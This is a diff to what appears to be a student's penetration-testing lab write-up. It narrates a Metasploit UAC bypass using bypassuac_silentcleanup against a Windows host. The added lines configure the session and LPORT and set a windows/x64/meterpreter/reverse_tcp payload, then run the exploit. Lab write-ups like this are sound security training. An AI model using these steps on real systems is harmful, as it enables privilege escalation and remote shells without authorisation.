@@ -99,11 +99,15 @@ I entered, "use exploit/windows/local/bypassuac_silentcleanup" to utilize an exp
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/50cb209c-8fe3-47f9-9a40-aac8d3c066b8)
 
-Next, I entered "show options" to check the host and port for the current session.
+Next, I entered "show options" to check the port, payload option and current session. The payload option is missing the x64 architecture, the port is set to 4444, and the session is not set. First I set the session to 1 to match the existing remote connection session, and then changed the LPORT to 4443. This is done to avoid any conflict in attempting multiple connections on the same port. Finally, I set the payload to include the x64 architecture with the command "set payload windows/x64/meterpreter/reverse_tcp". 
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/2b2eca48-9dcb-43ed-a626-fd7e6f0dac6d)
 
+To ensure the configuration was correct, I entered "show option" and confirmed the intended changes.
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/f36ea8ca-fe63-44d6-80a8-644b278b9e51)
+
+I then ran the exploit.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/78074d05-e177-4390-93f0-4740ae567606)
 
